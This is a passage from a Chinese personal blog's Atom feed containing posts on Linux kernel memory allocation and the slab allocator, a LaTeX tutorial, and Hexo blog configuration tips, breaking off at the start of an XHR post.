</li></ul><p>如果根据页的可移动性，将其进行分组，避免可回收页和不可回收页的交叉组织（例如在可移动页中间有不可移动页），并且在某个类型的页分配失败时，会从备用列表中寻找相应的页，这个顺序定义在page_alloc.c当中。</p><h1>内存分配方法</h1><p>分配内存通常可以调用一下几个函数：</p><ul>  <li>alloc_pages/alloc_page：分配若干个页，返回第一个struct page</li>  <li>get_zeroed_page：分配一个struct page，并且将内存填0</li>  <li>get_free_pages/get_free_page：返回值是虚拟地址</li>  <li>get_dma_pages：分配一个适用于DMA的页</li></ul><p>还有一些基于伙伴系统的方法，它们可能会借助页表进行映射，例如vmalloc，kmalloc。</p><p>内存分配时，通常要指定一个掩码<code>gfp_mask</code>，它定义了页所位于的区域、页在I/O和vfs上的操作，以及对分配操作的规定（阻塞、I/O、文件系统等）。</p><p>释放不再使用的页，同样可以采用struct page或者虚拟地址作为参数：</p><ul>  <li>free_page/free_pages：以struct page为参数</li>  <li>__free_page/__free_pages：以虚拟地址为参数</li></ul><h1>页框高速缓存</h1><p>（为了避免混淆，我把所有硬件的高速缓存称为cache）</p><p>内核经常会请求、释放单个页框，为了提高系统的性能，每个内存管理区都有一个每CPU的页框高速缓存，它包含一些预先分配的页框，能够用来满足CPU发出的单个页框请求。注意，这个页框高速缓存，和硬件上的cache的概念不同，但它们有一点小小的关联。由于每个CPU有自己的cache，那么假设一个进程刚刚释放了一个页，那么这个页就有很大概率还在cache当中。页框高速缓存保存热页（刚释放的，很可能在cache当中的页）和冷页（释放时间比较长的页）。其实对于分配热页来说，很好理解：用在cache中的页可以减少开销；但如果说是DMA设备使用，就要分配冷页了，因为它不会用到cache。</p><h1>slab分配器</h1><p>前面所说的伙伴系统，是用“页”为单位来进行，显然太大了；所以需要把页进一步拆分，变成更小的单位。slab分配器不仅仅提供小内存块，它还作为一个缓存使用，主要是针对那些经常分配、释放的对象：例如内核中的<code>fs_struct</code>数据结构，可能经常会分配和释放；那么slab就将释放的内存块保存在一个列表里面，而不是返回给伙伴系统。这样一来，再次分配新的内存块时，就不需要经过伙伴系统了，而且这些内存块还很可能在cache里面。</p><p><img src="http://www.meng.uno/images/%E5%86%85%E5%AD%98%E7%AE%A1%E7%90%86/slab%E5%88%86%E9%85%8D%E5%99%A8.png" alt=""></p><p>slab分配器包含几个部分：高速缓存<code>kmem_cache</code>，slab，以及slab中所包含的对象。每个高速缓存只负责一种对象类型，它由多个<code>slab</code>构成。<code>kmem_cache</code>当中有三个slab链表，分别对应用尽的slab、部分空闲的slab，和空闲的slab，还有一个<code>array_cache *</code>数组，它保存cpu最后释放的那些很可能处于“热”状态的对象。</p><p>而对于每个slab，则组织了一系列的object；它包含了空闲对象，正在使用的对象。那么为什么不直接用<code>kmem_cache</code>管理对象，要增加出<code>slab</code>这一层呢？这明显是为了更好的管理内存：通过<code>slab</code>，可以让内存的使用更平均，或者能够更好的管理空闲的页。</p><p>在新版本的内核中，<code>slab</code>由<code>kmem_cache_node</code>来管理，它包含3个链表<code>slabs_partial</code>，<code>slabs_full</code>和<code>slabs_free</code>。每个slab是一个或多个连续页帧的集合，每个objects由链表串联，现在slab中的object直接由<code>page</code>中的<code>freelist</code>来管理了。</p><pre><code>struct kmem_cache_node {spinlock_t list_lock;#ifdef CONFIG_SLABstruct list_head slabs_partial;/* partial list first, better asm code */struct list_head slabs_full;struct list_head slabs_free;unsigned long free_objects;unsigned int free_limit;unsigned int colour_next;/* Per-node cache coloring */struct array_cache *shared;/* shared per node */struct alien_cache **alien;/* on other nodes */unsigned long next_reap;/* updated without locking */int free_touched;/* updated without locking */#endif#ifdef CONFIG_SLUBunsigned long nr_partial;struct list_head partial;#ifdef CONFIG_SLUB_DEBUGatomic_long_t nr_slabs;atomic_long_t total_objects;struct list_head full;#endif#endif};</code></pre><p><img src="http://www.meng.uno/images/%E5%86%85%E5%AD%98%E7%AE%A1%E7%90%86/slab%E7%AE%A1%E7%90%86.png" alt=""></p><p>值得一提的是，<code>kmalloc</code>的实现也是也是基于slab来实现的，它包含一个数组，存放了一些用于不同长度的slab缓存，这也就是我们所说的“内存池”。</p><h1>slab着色</h1><p>slab着色与颜色并没有关系，它要解决的问题与硬件高速缓存有关。硬件高速缓存倾向于把大小一样的对象放在高速缓存内的相同偏移位置；而不同slab当中相同偏移量的对象，就会映射在高速缓存的同一行当中；这样高速缓存可能就会频繁的对同一高速缓存行进行更新，从而造成性能损失。</p><p>slab着色就是给每个slab分配一个随机的“颜色”，把它作为slab中对象需要移动的特定偏移量来使用，这样对象就会被放置到不同的缓存行。</p><p><br><br>本文链接： <a href="http://home.meng.uno/articles/41e39f2b/">http://home.meng.uno/articles/41e39f2b/</a> 欢迎转载！</p>]]></content>
    
    <summary type="html">
    
      页框管理与伙伴系统
这里的内存管理，指的是内核如何分配（为自己）动态内存。linux把页框作为一个管理的基本单位，用数据结构page对其进行描述。而所有的page则放在一个mem_map数组当中，进行管理。但计算机存在着一些限制，因此linux把内存划分为了几个管理区，包括ZONE_DMA、ZONE_NORMAL、ZONE_HIGHMEM等；而对页框的分配和释放，也是按照分区来进行管理的：



在每个分区之内，页框由伙伴系统来进行处理。伙伴系统主要是为了解决“外碎片”的问题：当请求和释放不断发生的时候，就很有可能导致操作系统中发生存在空闲的小块页框，但是没有大块连续页框的问题。伙伴系统把空闲
    
    </summary>
    
      <category term="Operation System" scheme="http://home.meng.uno/categories/Operation-System/"/>
    
    
      <category term="Linux" scheme="http://home.meng.uno/tags/Linux/"/>
    
      <category term="内存" scheme="http://home.meng.uno/tags/%E5%86%85%E5%AD%98/"/>
    
  </entry>
  
  <entry>
    <title>神奇的Latex</title>
    <link href="http://home.meng.uno/articles/67934c43/"/>
    <id>http://home.meng.uno/articles/67934c43/</id>
    <published>2016-03-04T13:43:28.000Z</published>
    <updated>2020-12-02T01:43:09.000Z</updated>
    
    <content type="html"><![CDATA[<blockquote>  <p>或许很多人都知道这个软件、语言的名字，也知道他至今只有两版（基本无错），但不是人人都会使用。</p></blockquote><h1>注释</h1><p>所有的注释行以<code>%</code>开头，没有多行注释语法。</p><h1>命令</h1><p>每一个LaTeX命令由反斜线<code>\</code>开始</p><p>LaTeX 文档以对编译对象文档的定义开始</p><p>这些文档包括书籍，报告，演示等</p><p>文档的选项出现在中括号里</p><h2 id="字体">字体</h2><p>我们设定文章字体为12pt</p><figure class="highlight plain">  <table>    <tr>      <td class="gutter">        <pre><span class="line">1</span><br></pre>      </td>      <td class="code">        <pre><span class="line">\documentclass[12pt]&#123;article&#125;</span><br></pre>      </td>    </tr>  </table></figure><h2 id="定义使用的库">定义使用的库</h2><p>如果想要引入图片，彩色字，或是其他语言的源码在您的文档中</p><p>需要增强 LaTeX 的功能。这将通过添加库来实现</p><p>下例中将要为展示数据引入 float 和 caption 库，为超链接引入 hyperref 库</p><figure class="highlight plain">  <table>    <tr>      <td class="gutter">        <pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre>      </td>      <td class="code">        <pre><span class="line">\usepackage&#123;caption&#125;</span><br><span class="line">\usepackage&#123;float&#125;</span><br><span class="line">\usepackage&#123;hyperref&#125;</span><br></pre>      </td>    </tr>  </table></figure><p>我们还可以定义其他文档属性！</p><figure class="highlight plain">  <table>    <tr>      <td class="gutter">        <pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre>      </td>      <td class="code">        <pre><span class="line">\author&#123;Chaitanya Krishna Ande, Sricharan Chiruvolu \&amp; Svetlana Golubeva&#125;</span><br><span class="line">\date&#123;\today&#125;</span><br><span class="line">\title&#123;Learn \LaTeX \hspace&#123;1pt&#125; in Y Minutes!&#125;</span><br></pre>      </td>    </tr>  </table></figure><h2 id="开始正文">开始正文</h2><p>这一行之前都是“序章”</p><figure class="highlight plain">  <table>    <tr>      <td class="gutter">        <pre><span class="line">1</span><br></pre>      </td>      <td class="code">        <pre><span class="line">\begin&#123;document&#125;</span><br></pre>      </td>    </tr>  </table></figure><p>如果想设定作者，时间，标题字段我们可使用 LaTeX 来建立标题页</p><figure class="highlight plain">  <table>    <tr>      <td class="gutter">        <pre><span class="line">1</span><br></pre>      </td>      <td class="code">        <pre><span class="line">\maketitle</span><br></pre>      </td>    </tr>  </table></figure><p>分章节时，可以建立目录</p><p>我们需要编译文档两次来保证他们顺序正确</p><p>使用目录来分开文档是很好的做法</p><p>这里我们使用 \newpage 操作符</p><figure class="highlight plain">  <table>    <tr>      <td class="gutter">        <pre><span class="line">1</span><br><span class="line">2</span><br></pre>      </td>      <td class="code">        <pre><span class="line">\newpage</span><br><span class="line">\tableofcontents</span><br></pre>      </td>    </tr>  </table></figure><figure class="highlight plain">  <table>    <tr>      <td class="gutter">        <pre><span class="line">1</span><br></pre>      </td>      <td class="code">        <pre><span class="line">\newpage</span><br></pre>      </td>    </tr>  </table></figure><p>许多研究论文有摘要部分。这可以使用预定义的指令来实现</p><p>它应被放在逻辑上正确的位置，即顶部标题等的下面和文章主体的上面</p><p>该指令可以在报告和文章中使用</p><figure class="highlight plain">  <table>    <tr>      <td class="gutter">        <pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre>      </td>      <td class="code">        <pre><span class="line">\begin&#123;abstract&#125;</span><br><span class="line"> \LaTeX \hspace&#123;1pt&#125; documentation written as \LaTeX! How novel and totally not my idea!</span><br><span class="line">\end&#123;abstract&#125;</span><br></pre>      </td>    </tr>  </table></figure><h2 id="章节指令">章节指令</h2><p>所有章节标题会自动地添加到目录中</p><figure class="highlight plain">  <table>    <tr>      <td class="gutter">        <pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre>      </td>      <td class="code">        <pre><span class="line">\section&#123;Introduction&#125;</span><br><span class="line">Hello, my name is Colton and together we&apos;re going to explore \LaTeX!</span><br><span class="line"></span><br><span class="line">\section&#123;Another section&#125;</span><br><span class="line">This is the text for another section. I think it needs a subsection.</span><br><span class="line"></span><br><span class="line">\subsection&#123;This is a subsection&#125; % 子章节同样非常直观</span><br><span class="line">I think we need another one</span><br><span class="line"></span><br><span class="line">\subsubsection&#123;Pythagoras&#125;</span><br><span class="line">Much better now.</span><br><span class="line">\label&#123;subsec:pythagoras&#125;</span><br></pre>      </td>    </tr>  </table></figure><p>使用型号我们可以借助 LaTeX 内置的编号功能</p><p>这一技巧也在其他指令中有效</p><figure class="highlight plain">  <table>    <tr>      <td class="gutter">        <pre><span class="line">1</span><br></pre>      </td>      <td class="code">        <pre><span class="line">\section*&#123;This is an unnumbered section&#125;</span><br></pre>      </td>    </tr>  </table></figure><p>然而并不是所有章节都要被标序号</p><figure class="highlight plain">  <table>    <tr>      <td class="gutter">        <pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre>      </td>      <td class="code">        <pre><span class="line">\section&#123;Some Text notes&#125;</span><br><span class="line">%\section&#123;Spacing&#125; % 需要增加有关空白间隔的信息</span><br><span class="line">\LaTeX \hspace&#123;1pt&#125; is generally pretty good about placing text where it should</span><br><span class="line">go. If </span><br><span class="line">a line \\ needs \\ to \\ break \\ you add \textbackslash\textbackslash </span><br><span class="line">\hspace&#123;1pt&#125; to the source code. \\ </span><br><span class="line"></span><br><span class="line">\section&#123;Lists&#125;</span><br><span class="line">Lists are one of the easiest things to create in \LaTeX! I need to go shopping</span><br><span class="line">tomorrow, so let&apos;s make a grocery list.</span><br><span class="line">\begin&#123;enumerate&#125; % 此处创建了一个“枚举”环境</span><br><span class="line">  % \item 使枚举增加一个单位</span><br><span class="line">  \item Salad.</span><br><span class="line">  \item 27 watermelon.</span><br><span class="line">  \item A single jackrabbit.</span><br><span class="line">  % 我们甚至可以通过使用 [] 覆盖美剧的数量</span><br><span class="line">  \item[how many?] Medium sized squirt guns.</span><br><span class="line"></span><br><span class="line">  Not a list item, but still part of the enumerate.</span><br><span class="line"></span><br><span class="line">\end&#123;enumerate&#125; % 所有环境都有终止符</span><br><span class="line"></span><br><span class="line">\section&#123;Math&#125;</span><br></pre>      </td>    </tr>  </table></figure><p>使用LaTex的一个最主要的方面是学术论文和技术文章，通常在数学和科学的领域。</p><h2 id="插入特殊符号">插入特殊符号！</h2><p>数学符号极多，远超出你能在键盘上找到的那些；</p><p>集合关系符，箭头，操作符，希腊字符等等，集合与关系在数学文章中很重要，如声明所有“ x 属于 X” <code>$\forall$ x $\in$ X</code>.</p><p>注意我们需要在这些符号之前和之后增加 <code>$</code> 符号，因为在编写时我们处于 <code>text-mode</code>，然而数学符号只在 <code>math-mode</code> 中存在。</p><p>text mode 进入 math-mode 使用 <code>$</code> 操作符，反之亦然，变量同时会在 <code>math-mode</code> 中被渲染。</p><p>我们也可以使用 <code>\[ \]</code> 来进入 <code>math mode</code>。</p><figure class="highlight plain">  <table>    <tr>      <td class="gutter">        <pre><span class="line">1</span><br></pre>      </td>      <td class="code">        <pre><span class="line">\[a^2 + b^2 = c^2 \]</span><br></pre>      </td>    </tr>  </table></figure><figure class="highlight plain">  <table>    <tr>      <td class="gutter">        <pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre>      </td>      <td class="code">        <pre><span class="line">My favorite Greek letter is $\xi$. I also like $\beta$, $\gamma$ and $\sigma$.</span><br><span class="line">I haven&apos;t found a Greek letter yet that \LaTeX \hspace&#123;1pt&#125; doesn&apos;t know</span><br><span class="line">about!</span><br></pre>      </td>    </tr>  </table></figure><p>常用函数操作符同样很重要：</p><figure class="highlight plain">  <table>    <tr>      <td class="gutter">        <pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre>      </td>      <td class="code">        <pre><span class="line">trigonometric functions ($\sin$, $\cos$, $\tan$), </span><br><span class="line">logarithms 和 exponentials ($\log$, $\exp$), </span><br><span class="line">limits ($\lim$), etc.</span><br></pre>      </td>    </tr>  </table></figure><h2 id="在-latex-指令中预定义">在 LaTeX 指令中预定义</h2><p>让我们写一个等式看看发生了什么：</p><figure class="highlight plain">  <table>    <tr>      <td class="gutter">        <pre><span class="line">1</span><br></pre>      </td>      <td class="code">        <pre><span class="line">$\cos(2\theta) = \cos^&#123;2&#125;(\theta) - \sin^&#123;2&#125;(\theta)$</span><br></pre>      </td>    </tr>  </table></figure><p>分数可以写成以下形式：</p><figure class="highlight plain">  <table>    <tr>      <td class="gutter">        <pre><span class="line">1</span><br><span class="line">2</span><br></pre>      </td>      <td class="code">        <pre><span class="line">% 10 / 7</span><br><span class="line">$$ ^&#123;10&#125;/_&#123;7&#125; $$</span><br></pre>      </td>    </tr>  </table></figure><p>相对比较复杂的分数可以写成</p><figure class="highlight plain">  <table>    <tr>      <td class="gutter">        <pre><span class="line">1</span><br><span class="line">2</span><br></pre>      </td>      <td class="code">        <pre><span class="line">% \frac&#123;numerator&#125;&#123;denominator&#125;</span><br><span class="line">$$ \frac&#123;n!&#125;&#123;k!(n - k)!&#125; $$ \\</span><br></pre>      </td>    </tr>  </table></figure><p>我们同样可以插入公式（equations）在环境 “equation environment” 下。</p><p>展示数学相关时，使用方程式环境</p><figure class="highlight plain">  <table>    <tr>      <td class="gutter">        <pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre>      </td>      <td class="code">        <pre><span class="line">\begin&#123;equation&#125; % 进入 math-mode</span><br><span class="line">    c^2 = a^2 + b^2.</span><br><span class="line">    \label&#123;eq:pythagoras&#125; % 为了下一步引用</span><br><span class="line">\end&#123;equation&#125; % 所有 \begin 语句必须有end语句对应</span><br></pre>      </td>    </tr>  </table></figure><p>引用我们的新等式！</p><figure class="highlight plain">  <table>    <tr>      <td class="gutter">        <pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre>      </td>      <td class="code">        <pre><span class="line">Eqn.~\ref&#123;eq:pythagoras&#125; is also known as the Pythagoras Theorem which is also</span><br><span class="line">the subject of Sec.~\ref&#123;subsec:pythagoras&#125;. A lot of things can be labeled: </span><br><span class="line">figures, equations, sections, etc.</span><br></pre>      </td>    </tr>  </table></figure><p>求和（Summations）与整合（Integrals）写作 <code>sum</code> 和 <code>int</code>。</p><p>一些编译器会提醒在等式环境中的空行</p><figure class="highlight plain">  <table>    <tr>      <td class="gutter">        <pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre>      </td>      <td class="code">        <pre><span class="line">\begin&#123;equation&#125; </span><br><span class="line">  \sum_&#123;i=0&#125;^&#123;5&#125; f_&#123;i&#125;</span><br><span class="line">\end&#123;equation&#125; </span><br><span class="line">\begin&#123;equation&#125; </span><br><span class="line">  \int_&#123;0&#125;^&#123;\infty&#125; \mathrm&#123;e&#125;^&#123;-x&#125; \mathrm&#123;d&#125;x</span><br><span class="line">\end&#123;equation&#125; </span><br><span class="line"></span><br><span class="line">\section&#123;Figures&#125;</span><br></pre>      </td>    </tr>  </table></figure><h2 id="插入">插入</h2><p>让我们插入图片，图片的放置非常微妙，我在每次使用时都会查找可用选项。</p><figure class="highlight plain">  <table>    <tr>      <td class="gutter">        <pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre>      </td>      <td class="code">        <pre><span class="line">\begin&#123;figure&#125;[H] % H 是放置选项的符号</span><br><span class="line">    \centering % 图片在本页居中</span><br><span class="line">    % 宽度放缩为页面的0.8倍</span><br><span class="line">    %\includegraphics[width=0.8\linewidth]&#123;right-triangle.png&#125; </span><br><span class="line">    % 需要使用想象力决定是否语句超出编译预期</span><br><span class="line">    \caption&#123;Right triangle with sides $a$, $b$, $c$&#125;</span><br><span class="line">    \label&#123;fig:right-triangle&#125;</span><br><span class="line">\end&#123;figure&#125;</span><br></pre>      </td>    </tr>  </table></figure><p>插入表格与插入图片方式相同</p><figure class="highlight plain">  <table>    <tr>      <td class="gutter">        <pre><span class="line">1</span><br></pre>      </td>      <td class="code">        <pre><span class="line">\subsection&#123;Table&#125;</span><br></pre>      </td>    </tr>  </table></figure><figure class="highlight plain">  <table>    <tr>      <td class="gutter">        <pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre>      </td>      <td class="code">        <pre><span class="line">\begin&#123;table&#125;[H]</span><br><span class="line">  \caption&#123;Caption for the Table.&#125;</span><br><span class="line">  % 下方的 &#123;&#125; 描述了表格中每一行的绘制方式</span><br><span class="line">  % 同样，我在每次使用时都会查找可用选项。</span><br><span class="line">  \begin&#123;tabular&#125;&#123;c|cc&#125; </span><br><span class="line">    Number &amp;  Last Name &amp; First Name \\ % 每一列被 &amp; 分开</span><br><span class="line">    \hline % 水平线</span><br><span class="line">    1 &amp; Biggus &amp; Dickus \\</span><br><span class="line">    2 &amp; Monty &amp; Python</span><br><span class="line">  \end&#123;tabular&#125;</span><br><span class="line">\end&#123;table&#125;</span><br></pre>      </td>    </tr>  </table></figure><p>现在增加一些源代码在 LaTex 文档中， 我们之后需要 LaTex 不翻译这些内容而仅仅是把他们打印出来而已。</p><p>这里使用 verbatim environment。</p><p>也有其他库存在 (如. minty, lstlisting, 等)，但是 verbatim 是最基础和简单的一个。</p><figure class="highlight plain">  <table>    <tr>      <td class="gutter">        <pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre>      </td>      <td class="code">        <pre><span class="line">\begin&#123;verbatim&#125; </span><br><span class="line">  print(&quot;Hello World!&quot;)</span><br><span class="line">  a%b; % 在这一环境下我们可以使用 %</span><br><span class="line">  random = 4; #decided by fair random dice roll</span><br><span class="line">\end&#123;verbatim&#125;</span><br><span class="line"></span><br><span class="line">\section&#123;Compiling&#125;</span><br></pre>      </td>    </tr>  </table></figure><p>现在你大概想了解如何编译这个美妙的文档，然后得到饱受称赞的<code>\LaTeX \hspace{1pt} pdf</code>文档</p><h2 id="latex组合">LaTex组合</h2><figure class="highlight plain">  <table>    <tr>      <td class="gutter">        <pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre>      </td>      <td class="code">        <pre><span class="line">\begin&#123;enumerate&#125;</span><br><span class="line">  \item Write the document in plain text (the ``source code&apos;&apos;).</span><br><span class="line">  \item Compile source code to produce a pdf. </span><br><span class="line">   The compilation step looks like this (in Linux): \\</span><br><span class="line">   \begin&#123;verbatim&#125; </span><br><span class="line">      &gt; pdflatex learn-latex.tex</span><br><span class="line">   \end&#123;verbatim&#125;</span><br><span class="line">\end&#123;enumerate&#125;</span><br></pre>      </td>    </tr>  </table></figure><p>许多 LaTex编译器把步骤1和2在同一个软件中进行了整合。所以你可以只看步骤1完全不看步骤2</p><p>步骤2同样在以下情境中使用情景 <code>\footnote</code></p><p>以防万一，当你使用引用时(如 Eqn.~\ref{eq:pythagoras})，你将需要多次运行步骤2来生成一个媒介文件 *.aux 。同时这也是在文档中增加脚标的方式。</p><p>在步骤1中，用普通文本写入格式化信息，步骤2的编译阶段则注意在步骤1 中定义的格式信息。</p><figure class="highlight plain">  <table>    <tr>      <td class="gutter">        <pre><span class="line">1</span><br></pre>      </td>      <td class="code">        <pre><span class="line">\section&#123;Hyperlinks&#125;</span><br></pre>      </td>    </tr>  </table></figure><p>同样可以在文档中加入超链接</p><p>使用如下命令在序言中引入库：</p><figure class="highlight plain">  <table>    <tr>      <td class="gutter">        <pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre>      </td>      <td class="code">        <pre><span class="line">\begin&#123;verbatim&#125; </span><br><span class="line">    \usepackage&#123;hyperref&#125;</span><br><span class="line">\end&#123;verbatim&#125;</span><br></pre>      </td>    </tr>  </table></figure><h2 id="超链接">超链接</h2><figure class="highlight plain">  <table>    <tr>      <td class="gutter">        <pre><span class="line">1</span><br><span class="line">2</span><br></pre>      </td>      <td class="code">        <pre><span class="line">\url&#123;https://learnxinyminutes.com/docs/latex/&#125;， 或  </span><br><span class="line">\href&#123;https://learnxinyminutes.com/docs/latex/&#125;&#123;shadowed by text&#125;</span><br></pre>      </td>    </tr>  </table></figure><p>你不可以增加特殊空格和符号，因为这将会造成编译错误</p><p>这个库同样在输出PDF文档时制造略缩的列表，或在目录中激活链接</p><figure class="highlight plain">  <table>    <tr>      <td class="gutter">        <pre><span class="line">1</span><br></pre>      </td>      <td class="code">        <pre><span class="line">\section&#123;End&#125;</span><br></pre>      </td>    </tr>  </table></figure><p>这就是全部内容了！</p><h2 id="引用部分">引用部分</h2><p>最简单的建立方式是使用书目提要章节</p><figure class="highlight plain">  <table>    <tr>      <td class="gutter">        <pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre>      </td>      <td class="code">        <pre><span class="line">\begin&#123;thebibliography&#125;&#123;1&#125;</span><br><span class="line">  % 与其他列表相同， \bibitem 命令被用来列出条目</span><br><span class="line">  % 每个记录可以直接被文章主体引用</span><br><span class="line">  \bibitem&#123;latexwiki&#125; The amazing \LaTeX \hspace&#123;1pt&#125; wikibook: &#123;\em </span><br><span class="line">https://en.wikibooks.org/wiki/LaTeX&#125;</span><br><span class="line">  \bibitem&#123;latextutorial&#125; An actual tutorial: &#123;\em http://www.latex-tutorial.com&#125;</span><br><span class="line">\end&#123;thebibliography&#125;</span><br></pre>      </td>    </tr>  </table></figure><h2 id="结束文档">结束文档</h2><figure class="highlight plain">  <table>    <tr>      <td class="gutter">        <pre><span class="line">1</span><br></pre>      </td>      <td class="code">        <pre><span class="line">\end&#123;document&#125;</span><br></pre>      </td>    </tr>  </table></figure><p><br><br>本文链接： <a href="http://home.meng.uno/articles/67934c43/">http://home.meng.uno/articles/67934c43/</a> 欢迎转载！</p>]]></content>
    
    <summary type="html">
    
      或许很多人都知道这个软件、语言的名字，也知道他至今只有两版（基本无错），但不是人人都会使用。

注释
所有的注释行以%开头，没有多行注释语法。

命令
每一个LaTeX命令由反斜线\开始

LaTeX 文档以对编译对象文档的定义开始

这些文档包括书籍，报告，演示等

文档的选项出现在中括号里

字体
我们设定文章字体为12pt

1


\documentclass[12pt]{article}


定义使用的库
如果想要引入图片，彩色字，或是其他语言的源码在您的文档中

需要增强 LaTeX 的功能。这将通过添加库来实现

下例中将要为展示数据引入 float 和 caption 库，为超
    
    </summary>
    
      <category term="Programming Language" scheme="http://home.meng.uno/categories/Programming-Language/"/>
    
    
      <category term="Latex" scheme="http://home.meng.uno/tags/Latex/"/>
    
      <category term="Tex" scheme="http://home.meng.uno/tags/Tex/"/>
    
      <category term="排版" scheme="http://home.meng.uno/tags/%E6%8E%92%E7%89%88/"/>
    
  </entry>
  
  <entry>
    <title>Hexo搭建博客小Tips</title>
    <link href="http://home.meng.uno/articles/d892151/"/>
    <id>http://home.meng.uno/articles/d892151/</id>
    <published>2016-03-03T07:21:11.000Z</published>
    <updated>2020-12-02T01:42:43.000Z</updated>
    
    <content type="html"><![CDATA[<blockquote>  <p>Hexo + GitHub 可能是一组比较简单的搭建博客的方式了。在使用Hexo的这么长的时间里，我发现很多不舒适的问题，通过搜索与探索，基本解决，现在分享出来。</p></blockquote><h1>添加404页面</h1><p>有人可能也有这个疑问，通过GitHub发布的静态网页，没有路由，怎么识别404错误呢？GitHub已经替我们想到了这些，我们只需要在我们的网站主目录添加<code>404.html</code>，就可以实现出错自动跳转到404界面了，关于404界面的书写，大家可以直接下载我的404页面：<a href="http://www.meng.uno/404.html" target="_blank" rel="noopener">http://www.meng.uno/404.html</a></p><h1>排除编译某文件</h1><h2 id="排除html等格式">排除HTML等格式</h2><p>在添加了404页面后，最简单的方法就是将<code>404.html</code>放到本地博客的<code>public</code>目录下。但是有个问题，也是最重要的，就是每次<code>hexo clean</code>之后，<code>public/</code>文件夹就会被删除，这样的话每次都需要粘贴进去，自然费时费力。</p><p>一个简单方法就是，将<code>404.html</code>等html文件，直接放到博客source或者主题source目录下，再<code>hexo g</code>生成，就自动生成了，但是又有个问题，虽然我们的html已经是完整的网页了，但是还是被hexo嵌入到系统的主题下。那怎么办呢？方法如下：</p><figure class="highlight plain">  <table>    <tr>      <td class="gutter">        <pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre>      </td>      <td class="code">        <pre><span class="line">layout: false</span><br><span class="line">title: &quot;404&quot;</span><br><span class="line">---</span><br></pre>      </td>    </tr>  </table></figure><p>将上述三行代码添加到不想被嵌入的HTML等文件的最前面。</p><h2 id="排除-md格式">排除.md格式</h2><p>在不跟踪了HTML文件后，我们是不是又想用同样的方法，让hexo不要编译readme.md文件呢？</p><p>从网上的信息看，大致有三种方法：</p><ul>  <li>将<code>Readme.md</code> 改名<code>Readme</code>；（在GitHub显示上有些问题）</li>  <li>将<code>Readme.md</code>改名<code>Read.mdown</code>；（完美）</li>  <li>在<code>_config.yml</code>文件中添加<code>skip_render:\n - README.md</code>。（这种方法也适用于其他文件）</li></ul><p><br><br>本文链接： <a href="http://home.meng.uno/articles/d892151/">http://home.meng.uno/articles/d892151/</a> 欢迎转载！</p>]]></content>
    
    <summary type="html">
    
      Hexo + GitHub 可能是一组比较简单的搭建博客的方式了。在使用Hexo的这么长的时间里，我发现很多不舒适的问题，通过搜索与探索，基本解决，现在分享出来。

添加404页面
有人可能也有这个疑问，通过GitHub发布的静态网页，没有路由，怎么识别404错误呢？GitHub已经替我们想到了这些，我们只需要在我们的网站主目录添加404.html，就可以实现出错自动跳转到404界面了，关于404界面的书写，大家可以直接下载我的404页面：http://www.meng.uno/404.html

排除编译某文件
排除HTML等格式
在添加了404页面后，最简单的方法就是将404.html放到
    
    </summary>
    
      <category term="Software Engineering" scheme="http://home.meng.uno/categories/Software-Engineering/"/>
    
    
      <category term="Hexo" scheme="http://home.meng.uno/tags/Hexo/"/>
    
      <category term="博客" scheme="http://home.meng.uno/tags/%E5%8D%9A%E5%AE%A2/"/>
    
  </entry>
  
  <entry>
    <title>XHR及POST数据</title>
    <link href="http://home.meng.uno/articles/c2e4dce5/"/>
    <id>http://home.meng.uno/articles/c2e4dce5/</id>
    <published>2016-02-28T14:21:20.000Z</published>
    <updated>2020-12-02T02:11:16.000Z</updated>
    
